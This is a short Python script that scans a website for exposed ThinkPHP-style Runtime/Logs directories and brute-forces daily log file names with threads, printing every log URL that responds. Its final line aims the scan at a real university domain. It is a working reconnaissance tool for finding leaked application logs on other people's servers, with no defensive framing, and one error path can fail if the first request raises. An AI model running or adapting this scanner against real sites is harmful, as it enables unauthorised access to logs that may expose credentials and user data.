import requests
import threading


class myThread(threading.Thread):
    def __init__(self,url):
        threading.Thread.__init__(self)
        self.url = url

    def run(self):
        LogPath = self.url
        flag = 0
        try:
            res = requests.get(LogPath)
            flag = 1
        except:
            return
        if flag:
            if res.status_code == 200:
                print(LogPath)


def formaturl(url):
    if (not url.startswith("http://")) and (not url.startswith("https://")):
        url = "http://" + url
    if not url.endswith("/"):
        url += "/"
    return url

def Scan(url):
    url = formaturl(url)
    basePath = ''
    LogsPath = []
    try:
        res = requests.get(url+'Runtime',timeout=3)
    except:
        pass
    if not (res.status_code == 403 or res.status_code == 200):
        for i in ['App','Application','Data']:
            try:
                res = requests.get(url + i)
            except:
                continue
            if res.status_code == 403 or res.status_code == 200:
                basePath = i
                break

    for i in ['Admin','Index','Home','Manage']:
        try:
            res = requests.get(url + basePath + '/Runtime/Logs/' + i)
        except:
            continue
        if res.status_code == 403 or res.status_code == 200:
            LogsPath.append(i)

    for i in LogsPath:
        LogPath = url + basePath + '/Runtime/Logs/' + i
        threads = []
        for j in range(1,9):
            for k in range(1,32):
                Log = LogPath + '/19_' + str(j).zfill(2) + '_' + str(k).zfill(2) + '.log'
                threads.append(myThread(Log))
        for i in threads:
            i.start()
            while True:
                if (len(threading.enumerate()) < 5):
                    break

Scan('http://iei.ruc.edu.cn')
